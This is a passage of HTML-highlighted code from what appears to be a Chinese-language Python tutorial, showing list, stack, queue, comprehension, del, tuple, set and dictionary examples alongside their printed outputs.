class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># [1, 2, 1, 5]</span>\n<span class=\"token builtin\">list</span><span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">999</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># [1, 2, 1, 5, 999]</span>\nlist2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">44</span><span class=\"token punctuation\">,</span> <span class=\"token number\">55</span><span class=\"token punctuation\">]</span>\n<span class=\"token builtin\">list</span><span class=\"token punctuation\">.</span>extend<span class=\"token punctuation\">(</span>list2<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># [1, 2, 1, 5, 999, 44, 55]</span>\n<span class=\"token builtin\">list</span><span class=\"token punctuation\">.</span>insert<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'hhhh'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># [1, 2, 'hhhh', 1, 5, 999, 44, 55]</span>\n<span class=\"token builtin\">list</span><span class=\"token punctuation\">.</span>remove<span class=\"token punctuation\">(</span><span class=\"token string\">'hhhh'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># [1, 2, 1, 5, 999, 44, 55]</span>\nvar <span class=\"token operator\">=</span> list2<span class=\"token punctuation\">.</span>pop<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>var<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 55</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>list2<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># [44]</span>\nlist2<span class=\"token punctuation\">.</span>clear<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>list2<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># []</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 1</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">.</span>count<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 2</span>\n<span class=\"token builtin\">list</span><span class=\"token punctuation\">.</span>sort<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># [1, 1, 2, 5, 44, 55, 999]</span>\n<span class=\"token builtin\">list</span><span class=\"token punctuation\">.</span>reverse<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># [999, 55, 44, 5, 2, 1, 1]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">.</span>copy<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># [999, 55, 44, 5, 2, 1, 1]</span>\n\n<span class=\"token triple-quoted-string string\">'''\n[1, 2, 1, 5]\n[1, 2, 1, 5, 999]\n[1, 2, 1, 5, 999, 44, 55]\n[1, 2, 'hhhh', 1, 5, 999, 44, 55]\n[1, 2, 1, 5, 999, 44, 55]\n55\n[44]\n[]\n1\n2\n[1, 1, 2, 5, 44, 55, 999]\n[999, 55, 44, 5, 2, 1, 1]\n[999, 55, 44, 5, 2, 1, 1]\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"将列表当做堆栈使用\"><a href=\"#将列表当做堆栈使用\" class=\"headerlink\" title=\"将列表当做堆栈使用\"></a>将列表当做堆栈使用</h4><p>最先进入的元素最后一个被释放（后进先出）。用 append() 方法可以把一个元素添加到堆栈顶。用不指定索引的 pop() 方法可以把一个元素从堆栈顶释放出来。</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">stack <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'test'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'999'</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>stack<span class=\"token punctuation\">)</span>\nstack<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">33</span><span class=\"token punctuation\">)</span>\nstack<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">44</span><span class=\"token punctuation\">)</span>\nstack<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">55</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>stack<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>stack<span class=\"token punctuation\">.</span>pop<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>stack<span class=\"token punctuation\">.</span>pop<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>stack<span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n[1, 3, 'test', '999']\n[1, 3, 'test', '999', 33, 44, 55]\n55\n44\n[1, 3, 'test', '999', 33]\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"将列表当作队列使用\"><a href=\"#将列表当作队列使用\" class=\"headerlink\" title=\"将列表当作队列使用\"></a>将列表当作队列使用</h4><p>队列里第一加入的元素，第一个取出来</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> collections <span class=\"token keyword\">import</span> deque\nqueue <span class=\"token operator\">=</span> deque<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'test'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'999'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\nqueue<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token string\">'hhh'</span><span class=\"token punctuation\">)</span>\nqueue<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token string\">'aaaa'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>queue<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>queue<span class=\"token punctuation\">.</span>popleft<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>queue<span class=\"token punctuation\">.</span>popleft<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>queue<span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n[1, 3, 'test', '999', 33]\ndeque([1, 2, 'test', '999', 'hhh', 'aaaa'])\n1\n2\ndeque(['test', '999', 'hhh', 'aaaa'])\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"列表推导式\"><a href=\"#列表推导式\" class=\"headerlink\" title=\"列表推导式\"></a>列表推导式</h4><p>列表推导式提供了从序列创建列表的简单途径。应用程序将一些操作应用于某个序列的每个元素，用其获得的结果作为生成新列表的元素，或者根据确定的判定条件创建子序列。</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">var <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>var<span class=\"token punctuation\">)</span>\nvvar <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">2</span> <span class=\"token operator\">*</span> x <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> var<span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>vvar<span class=\"token punctuation\">)</span>\nvvaar <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> x<span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> var<span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>vvaar<span class=\"token punctuation\">)</span>\nvar1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">' dcc'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'   ssss'</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> var1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\nvar2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span>\nvar3 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>x <span class=\"token operator\">*</span> y <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> var <span class=\"token keyword\">for</span> y <span class=\"token keyword\">in</span> var2<span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>var3<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>var<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> var2<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>var<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">round</span><span class=\"token punctuation\">(</span><span class=\"token number\">355</span><span class=\"token operator\">/</span><span class=\"token number\">113</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n[1, 2, 4, 8]\n[2, 4, 8, 16]\n[[1, 2], [2, 4], [4, 8], [8, 16]]\n['dcc', 'ssss']\n[2, 3, 4, 4, 4, 6, 8, 8, 8, 12, 16, 16, 16, 24, 32, 32]\n[2, 6, 16, 32]\n['3.1', '3.14', '3.142', '3.1416', '3.14159']\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"嵌套列表解析\"><a href=\"#嵌套列表解析\" class=\"headerlink\" title=\"嵌套列表解析\"></a>嵌套列表解析</h4><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">matrix <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n    <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>matrix<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span>row<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> row <span class=\"token keyword\">in</span> matrix<span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 3*4转为4*3</span>\nmatrix <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n    <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">]</span>\ntransposed <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    transposed<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>row<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> row <span class=\"token keyword\">in</span> matrix<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>transposed<span class=\"token punctuation\">)</span>\nmatrix <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n    <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">]</span>\ntransposed <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\"># the following 3 lines implement the nested listcomp</span>\n    transposed_row <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">for</span> row <span class=\"token keyword\">in</span> matrix<span class=\"token punctuation\">:</span>\n        transposed_row<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>row<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\ttransposed<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>transposed_row<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>transposed<span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n[[1, 2, 3, 4], [2, 3, 4, 5], [3, 4, 5, 6]]\n[[1, 2, 3], [2, 3, 4], [3, 4, 5], [4, 5, 6]]\n[[1, 2, 3], [2, 3, 4], [3, 4, 5], [4, 5, 6]]\n[[1, 2, 3], [2, 3, 4], [3, 4, 5], [4, 5, 6]]\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"del语句\"><a href=\"#del语句\" class=\"headerlink\" title=\"del语句\"></a>del语句</h4><p>使用 del 语句可以从一个列表中依索引而不是值来删除一个元素。</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">var <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'test'</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>var<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">del</span> var<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>var<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">del</span> var<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>var<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">del</span> var<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>var<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">del</span> var\n\n<span class=\"token triple-quoted-string string\">'''\n[1, 23, 3, 6, 'test']\n[1, 23, 6, 'test']\n[23, 'test']\n[]\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"元组和序列\"><a href=\"#元组和序列\" class=\"headerlink\" title=\"元组和序列\"></a>元组和序列</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token builtin\">tuple</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">tuple</span><span class=\"token punctuation\">)</span>\ntuple2 <span class=\"token operator\">=</span> <span class=\"token builtin\">tuple</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'test'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'hhhh'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'aaaa'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>tuple2<span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n(1, 2, 3, 4, 5)\n((1, 2, 3, 4, 5), ('test', 'hhhh', 'aaaa'))\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"集合-1\"><a href=\"#集合-1\" class=\"headerlink\" title=\"集合\"></a>集合</h3><p>功能包括关系测试和消除重复元素</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">basket <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">'apple'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'orange'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'apple'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'pear'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'orange'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'banana'</span><span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>basket<span class=\"token punctuation\">)</span>                      <span class=\"token comment\"># 删除重复的</span>\n<span class=\"token comment\"># {'banana', 'orange', 'apple', 'pear'}</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'orange'</span> <span class=\"token keyword\">in</span> basket<span class=\"token punctuation\">)</span>                 <span class=\"token comment\"># 检测成员</span>\n<span class=\"token comment\"># True</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'crabgrass'</span> <span class=\"token keyword\">in</span> basket<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># False</span>\n<span class=\"token comment\"># 以下演示了两个集合的操作</span>\na <span class=\"token operator\">=</span> <span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token string\">'abracadabra'</span><span class=\"token punctuation\">)</span>\nb <span class=\"token operator\">=</span> <span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token string\">'alacazam'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>                      <span class=\"token comment\"># a 中唯一的字母</span>\n<span class=\"token comment\"># {'c', 'r', 'b', 'a', 'd'}</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a <span class=\"token operator\">-</span> b<span class=\"token punctuation\">)</span>                  <span class=\"token comment\"># 在 a 中的字母，但不在 b 中</span>\n<span class=\"token comment\"># {'r', 'b', 'd'}</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a <span class=\"token operator\">|</span> b<span class=\"token punctuation\">)</span>                  <span class=\"token comment\"># 在 a 或 b 中的字母</span>\n<span class=\"token comment\"># {'c', 'r', 'l', 'm', 'z', 'b', 'a', 'd'}</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a <span class=\"token operator\">&amp;</span> b<span class=\"token punctuation\">)</span>                  <span class=\"token comment\"># 在 a 和 b 中都有的字母</span>\n<span class=\"token comment\"># {'c', 'a'}</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a <span class=\"token operator\">^</span> b<span class=\"token punctuation\">)</span>                  <span class=\"token comment\"># 在 a 或 b 中的字母，但不同时在 a 和 b 中</span>\n<span class=\"token comment\"># {'m', 'z', 'r', 'b', 'l', 'd'}</span>\n\na <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>x <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token string\">'abracadabra'</span> <span class=\"token keyword\">if</span> x <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> <span class=\"token string\">'abc'</span><span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># {'d', 'r'}</span>\n\n<span class=\"token triple-quoted-string string\">'''\n{'banana', 'orange', 'apple', 'pear'}\nTrue\nFalse\n{'c', 'r', 'b', 'a', 'd'}\n{'r', 'b', 'd'}\n{'c', 'r', 'l', 'm', 'z', 'b', 'a', 'd'}\n{'c', 'a'}\n{'m', 'z', 'r', 'b', 'l', 'd'}\n{'d', 'r'}\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"字典-1\"><a href=\"#字典-1\" class=\"headerlink\" title=\"字典\"></a>字典</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">dict</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token string\">'sape'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4139</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'guido'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4127</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'jack'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4098</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># {'sape': 4139, 'guido': 4127, 'jack': 4098}</span>\n<span class=\"token 